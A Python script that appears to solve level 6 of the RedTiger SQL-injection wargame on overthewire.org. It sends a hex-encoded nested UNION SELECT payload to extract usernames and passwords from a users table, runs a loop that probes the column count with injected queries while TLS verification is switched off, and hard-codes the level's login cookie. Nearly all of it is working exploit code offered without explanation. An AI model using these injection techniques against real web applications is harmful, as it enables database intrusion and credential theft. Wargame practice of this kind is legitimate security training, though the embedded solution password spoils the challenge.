import requests

url = "https://redtiger.labs.overthewire.org/level6.php"
cookies = {
    "level6login":"the_stone_is_cold"
}


def inject_payload():
    payload = '0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f7573657273207768657265207374617475733d31202d2d20'
    params = {
        "user": "0 union select 1,{0},3,4,5 from level6_users--".format(payload)
    }
    r = requests.get(url, cookies=cookies, params=params)
    print(r.text)

inject_payload()



def find_column_number():
    n = 1
    bef_ret = ''
    for l in range(1,10):
        params = {
            "user": "1 union select {0} from level6_users-- ".format(str(n))
        }
        print ("1 union select {0} from level6_users-- ".format(str(n)))
        n = str(n) + "," + str(l+1)
        r = requests.post(url, cookies=cookies, params=params, verify=False)
        if bef_ret!=r.content and bef_ret!='':
            print (r.text)
            break

        bef_ret = r.content
